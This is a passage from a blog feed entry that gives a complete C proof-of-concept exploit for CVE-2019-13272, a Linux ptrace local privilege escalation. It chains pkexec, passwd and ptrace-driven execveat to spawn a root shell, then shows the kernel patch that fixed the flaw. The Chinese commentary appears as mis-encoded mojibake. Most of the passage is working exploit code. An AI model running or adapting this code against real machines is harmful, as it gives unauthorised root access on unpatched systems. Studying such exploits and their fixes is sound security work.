function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv, <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>    <span class="hljs-type">char</span> buf[<span class="hljs-number">0x1000</span>];<br><br>    <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">strcmp</span>(argv[<span class="hljs-number">0</span>], <span class="hljs-string">&quot;stage2&quot;</span>))<br>        <span class="hljs-keyword">return</span> middleStage();<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">strcmp</span>(argv[<span class="hljs-number">0</span>], <span class="hljs-string">&quot;stage3&quot;</span>))<br>        <span class="hljs-keyword">return</span> getRootShell();<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[+] CVE-2019-13272 POC of local privileged.&quot;</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[+] Written by arttnba3.&quot;</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Start exploiting...&quot;</span>);<br><br>    <span class="hljs-comment">// find the helper</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Finding the helper...&quot;</span>);<br>    helper = findHelper();<br>    helper_basename = basename(helper);<br>    <span class="hljs-keyword">if</span> (!helper)<br>    &#123;<br>        <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;[x] Unable to find suitable helper on your platform!\n&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*] Using helper: %s\n&quot;</span>, helper);<br><br>    <span class="hljs-comment">// create the pipe for blocking child</span><br>    pipe2(pipe_for_block, O_DIRECT | O_CLOEXEC); <span class="hljs-comment">// set the pipe in packet mode, which meant that the data should be received in packets</span><br>    fcntl(pipe_for_block[<span class="hljs-number">0</span>], F_SETPIPE_SZ, <span class="hljs-number">0x1000</span>);<br>    write(pipe_for_block[<span class="hljs-number">1</span>], <span class="hljs-string">&quot;arttnba3&quot;</span>, <span class="hljs-number">8</span>); <span class="hljs-comment">// temp packet to make the following ones stuck, the stdout of task B will be redirect to it</span><br><br>    <span class="hljs-comment">// fork out task B</span><br>    <span class="hljs-comment">// two kinds of writing, all OK</span><br>    <span class="hljs-comment">// pid_task_b = clone(middlePtracee, (size_t)malloc(0x1000 * 100) + 0x1000 * 100, CLONE_VM | CLONE_VFORK | SIGCHLD, NULL);</span><br>    pid_task_b = fork();<br>    <span class="hljs-keyword">if</span> (!pid_task_b)<br>    &#123;<br>        middlePtracee();<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br><br>    <span class="hljs-built_in">sprintf</span>(buf, <span class="hljs-string">&quot;/proc/%d/comm&quot;</span>, pid_task_b);<br>    <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>)<br>    &#123;<br>        <span class="hljs-type">char</span> comm[<span class="hljs-number">0x100</span>];<br>        <span class="hljs-type">int</span> comm_fd = open(buf, O_RDONLY);<br>        <span class="hljs-keyword">if</span> (comm_fd &lt; <span class="hljs-number">0</span>)<br>        &#123;<br>            <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;[x] Failed to read comm of task B!\n&quot;</span>);<br>            <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>        &#125;<br>        comm[read(comm_fd, comm, <span class="hljs-number">0x100</span> - <span class="hljs-number">1</span>)] = <span class="hljs-string">&#x27;\0&#x27;</span>;<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">strncmp</span>(comm, helper_basename, <span class="hljs-number">10</span>))<br>            <span class="hljs-keyword">break</span>;<br>        usleep(<span class="hljs-number">100000</span>);<br>    &#125;<br><br>    <span class="hljs-comment">// task B got the root, wait a while it&#x27;ll lose privilege, then task A attach to it</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Task A attaching to task B soooon...&quot;</span>);<br>    ptrace(PTRACE_ATTACH, pid_task_b, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>);<br>    waitpid(pid_task_b, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>); <span class="hljs-comment">// 0 means no extra options</span><br><br>    <span class="hljs-comment">// force the task B to execve stage2</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Forcing task B to execve stage2...&quot;</span>);<br>    forceChildToExecve(pid_task_b, <span class="hljs-number">0</span>, <span class="hljs-string">&quot;stage2&quot;</span>);<br>    <span class="hljs-comment">//force_exec_and_wait(pid_task_b, 0, &quot;stage2&quot;);</span><br>    <span class="hljs-built_in">exit</span>(EXIT_SUCCESS);<br>&#125;<br><br><span class="hljs-type">char</span>* <span class="hljs-title function_">findHelper</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">stat</span> <span class="hljs-title">buf</span>;</span><br>    <br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-keyword">sizeof</span>(helper_list) / <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">char</span>*); i++)<br>    &#123;<br>        <span class="hljs-keyword">if</span> (!stat(helper_list[i], &amp;buf))<br>            <span class="hljs-keyword">return</span> helper_list[i];<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>&#125;<br><br><span class="hljs-comment">// task B</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">middlePtracee</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    self_fd = open(<span class="hljs-string">&quot;/proc/self/exe&quot;</span>, O_RDONLY);<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">passwd</span> *<span class="hljs-title">pw</span> =</span> getpwuid(getuid());<br>    pid_task_b = getpid();<br><br>    pid_task_c = fork();<br>    <span class="hljs-keyword">if</span> (!pid_task_c)<br>        <span class="hljs-keyword">return</span> finalPtracee();<br>    <br>    <span class="hljs-built_in">fputs</span>(<span class="hljs-string">&quot;[+] Task B fork out task C.\n&quot;</span>, <span class="hljs-built_in">stderr</span>);<br>    <span class="hljs-built_in">fputs</span>(<span class="hljs-string">&quot;[*] Task B execve pkexec soooon...\n&quot;</span>, <span class="hljs-built_in">stderr</span>);<br>    dup2(self_fd, <span class="hljs-number">0</span>); <span class="hljs-comment">// got stdin close</span><br>    dup2(pipe_for_block[<span class="hljs-number">1</span>], <span class="hljs-number">1</span>); <span class="hljs-comment">// redirect stdout to block it</span><br>    execl(<span class="hljs-string">&quot;/usr/bin/pkexec&quot;</span>, basename(<span class="hljs-string">&quot;/usr/bin/pkexec&quot;</span>), <span class="hljs-string">&quot;--user&quot;</span>, pw-&gt;pw_name, helper, <span class="hljs-string">&quot;--helper&quot;</span>, <span class="hljs-literal">NULL</span>);<br><br>    <span class="hljs-comment">// if we arrive there, we failed.</span><br>    <span class="hljs-built_in">fputs</span>(<span class="hljs-string">&quot;[x] Failed to execve pkexec!&quot;</span>, <span class="hljs-built_in">stderr</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>&#125;<br><br><span class="hljs-comment">// task again B</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">middleStage</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-type">pid_t</span> child = waitpid(<span class="hljs-number">-1</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>);<br>    forceChildToExecve(child, <span class="hljs-number">114</span>, <span class="hljs-string">&quot;stage3&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-comment">// task C</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">finalPtracee</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    pid_task_c = getpid();<br>    <span class="hljs-type">char</span> buf[<span class="hljs-number">0x1000</span>];<br>    <span class="hljs-type">char</span> needle[<span class="hljs-number">0x100</span>];<br>    <span class="hljs-type">char</span> uid_buf[<span class="hljs-number">0x100</span>];<br>    <span class="hljs-type">int</span> task_B_status_fd;<br><br>    <span class="hljs-built_in">sprintf</span>(needle, <span class="hljs-string">&quot;/proc/%d/status&quot;</span>, pid_task_b);<br>    <span class="hljs-built_in">sprintf</span>(uid_buf, <span class="hljs-string">&quot;Uid:\t%d\t0\t&quot;</span>, getuid());<br>    dup2(self_fd, <span class="hljs-number">114</span>);<br>    task_B_status_fd = open(needle, O_RDONLY);<br>    <span class="hljs-keyword">if</span> (task_B_status_fd &lt; <span class="hljs-number">0</span>)<br>    &#123;<br>        <span class="hljs-built_in">fputs</span>(<span class="hljs-string">&quot;[x] Failed to get status of task B!&quot;</span>, <span class="hljs-built_in">stderr</span>);<br>        <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>    &#125;<br><br>    <span class="hljs-comment">// check out uid of task B</span><br>    <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>)<br>    &#123;<br>        buf[pread(task_B_status_fd, buf, <span class="hljs-number">0x1000</span> - <span class="hljs-number">1</span>, <span class="hljs-number">0</span>)] = <span class="hljs-string">&#x27;\0&#x27;</span>;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strstr</span>(buf, uid_buf)) <span class="hljs-comment">// task B got root</span><br>            <span class="hljs-keyword">break</span>;<br>    &#125;<br><br>    <span class="hljs-comment">// let task B(root) be ptracer</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[+] Task B is root now!&quot;</span>);<br>    ptrace(PTRACE_TRACEME, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Task C execve another suid programme sooooon...&quot;</span>);<br>    execl(<span class="hljs-string">&quot;/usr/bin/passwd&quot;</span>, <span class="hljs-string">&quot;passwd&quot;</span>, <span class="hljs-literal">NULL</span>);<br><br>    <span class="hljs-comment">// if we arrived there, execve failed </span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[x] Task C failed to execve!&quot;</span>);<br>&#125;<br><br><span class="hljs-comment">// task again C</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">getRootShell</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    setresuid(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>    setresgid(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">return</span> system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>&#125;<br><br><span class="hljs-comment">// force a child to execve by ptrace through execveat syscall</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">forceChildToExecve</span><span class="hljs-params">(<span class="hljs-type">pid_t</span> child_pid, <span class="hljs-type">int</span> exec_fd, <span class="hljs-type">char</span> *argv)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">user_regs_struct</span> <span class="hljs-title">regs</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">iovec</span> <span class="hljs-title">iov</span> =</span> <br>    &#123;<br>        .iov_base = &amp;regs,<br>        .iov_len = <span class="hljs-keyword">sizeof</span>(regs),<br>    &#125;;<br>    <span class="hljs-type">size_t</span> child_stack;<br>    <span class="hljs-type">size_t</span> insert_data[<span class="hljs-number">0x100</span>];<br><br>    ptrace(PTRACE_SYSCALL, child_pid, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>); <span class="hljs-comment">// wait for child meeting a syscall</span><br>    waitpid(child_pid, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>);    <span class="hljs-comment">// wait for child to execve</span><br>    ptrace(PTRACE_GETREGSET, child_pid, NT_PRSTATUS, &amp;iov); <span class="hljs-comment">// get env of child</span><br>    <br>    <span class="hljs-comment">// prepare the stack data</span><br>    child_stack = (regs.rsp - <span class="hljs-number">0x1000</span>) &amp; ~<span class="hljs-number">0xfff</span>UL; <br>    <span class="hljs-built_in">memset</span>(insert_data, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(insert_data));<br>    <span class="hljs-type">int</span> idx = <span class="hljs-number">0</span>;<br>    insert_data[idx++] = child_stack + <span class="hljs-number">0x18</span>;    <span class="hljs-comment">// argv arrays</span><br>    insert_data[idx++] = <span class="hljs-number">0</span>;<br>    insert_data[idx++] = <span class="hljs-number">0</span>;                     <span class="hljs-comment">// env arrays</span><br>    insert_data[idx++] = *(<span class="hljs-type">size_t</span>*)argv;          <span class="hljs-comment">// argv[0]</span><br>    insert_data[idx++] = <span class="hljs-number">0</span>;                     <span class="hljs-comment">// path</span><br><br>    <span class="hljs-comment">// copy to child stack</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; idx; i++)<br>        ptrace(PTRACE_POKETEXT, child_pid, child_stack + i * <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">size_t</span>), insert_data[i]);<br><br>    <span class="hljs-comment">// execveat(exec_fd, NULL, argv, NULL, flags)</span><br>    regs.orig_rax = __NR_execveat;<br>    regs.rdi = exec_fd;<br>    regs.rsi = child_stack + <span class="hljs-number">0x20</span>;  <span class="hljs-comment">// path -&gt; NULL</span><br>    regs.rdx = child_stack;         <span class="hljs-comment">// argv -&gt; &quot;stagex&quot;, NULL</span><br>    regs.r10 = child_stack + <span class="hljs-number">0x10</span>;  <span class="hljs-comment">// envp -&gt; NULL</span><br>    regs.r8  = AT_EMPTY_PATH;       <span class="hljs-comment">// flags</span><br><br>    ptrace(PTRACE_SETREGSET, child_pid, NT_PRSTATUS, &amp;iov);<br>    ptrace(PTRACE_DETACH, child_pid, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>);<br>    waitpid(child_pid, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>);<br>&#125;<br><br></code></pre></td></tr></table></figure><p>è¿è¡Œå³å¯å®Œæˆææƒ</p><p><img src="https://s2.loli.net/2022/01/17/VgmbRFaIZo3qY8u.png" alt="image.png"></p><h1>0x03.æ¼æ´ä¿®å¤</h1><p>Jann Horn æäº¤çš„æ¼æ´ä¿®å¤æ–¹æ¡ˆæ¯”è¾ƒç®€å•ï¼Œå¦‚ä¸‹ï¼š</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs diff"><span class="hljs-comment">diff --git a/kernel/ptrace.c b/kernel/ptrace.c</span><br><span class="hljs-comment">index 8456b6e2205f7..705887f63288d 100644</span><br><span class="hljs-comment">--- a/kernel/ptrace.c</span><br><span class="hljs-comment">+++ b/kernel/ptrace.c</span><br><span class="hljs-meta">@@ -79,9 +79,7 @@</span> void __ptrace_link(struct task_struct *child, struct task_struct *new_parent,<br>  */<br> static void ptrace_link(struct task_struct *child, struct task_struct *new_parent)<br> &#123;<br><span class="hljs-deletion">-rcu_read_lock();</span><br><span class="hljs-deletion">-__ptrace_link(child, new_parent, __task_cred(new_parent));</span><br><span class="hljs-deletion">-rcu_read_unlock();</span><br><span class="hljs-addition">+__ptrace_link(child, new_parent, current_cred());</span><br> &#125;<br></code></pre></td></tr></table></figure><p>æˆ‘ä»¬å¯ä»¥çœ‹å‡ºè¿™ä¸ªè¡¥ä¸åªåšäº†ä¸€ä»¶å°äº‹ï¼š</p><ul><li><strong>ä¸ä½¿ç”¨ rcu æœºåˆ¶ï¼Œå°† ptracee-&gt;parent_cred è®¾ä¸ºå½“å‰è¿›ç¨‹ credï¼Œå³ ptracee åŸæ¥çš„ cred</strong></li></ul><p>è¿™å°† ptracer çš„æƒé™é™åˆ¶ä¸ºå‘èµ· ptrace è¯·æ±‚çš„ ptracee çš„æƒé™ï¼Œç¬”è€…ä¸ªäººè®¤ä¸ºè¿™ä¸ªä¿®å¤è¿˜æ˜¯æ¯”è¾ƒæˆåŠŸçš„</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;ä½ ä¸è®¸è¯´ä»–ï¼Œä»–æ˜¯ä½ çˆ¹ï¼Ÿ&lt;/p&gt;</summary>
    
    
    
    <category term="CVE" scheme="http://blog.arttnba3.cn/categories/CVE/"/>
    
    
    <category term="Linux" scheme="http://blog.arttnba3.cn/tags/Linux/"/>
    
    <category term="Linux Kernel" scheme="http://blog.arttnba3.cn/tags/Linux-Kernel/"/>
    
    <category term="Pwn" scheme="http://blog.arttnba3.cn/tags/Pwn/"/>
    
    <category term="CVE" scheme="http://blog.arttnba3.cn/tags/CVE/"/>
    
    <category term="ææƒ" scheme="http://blog.arttnba3.cn/tags/%E6%8F%90%E6%9D%83/"/>
    
    <category term="ptrace" scheme="http://blog.arttnba3.cn/tags/ptrace/"/>
    
  </entry>
  
</feed>
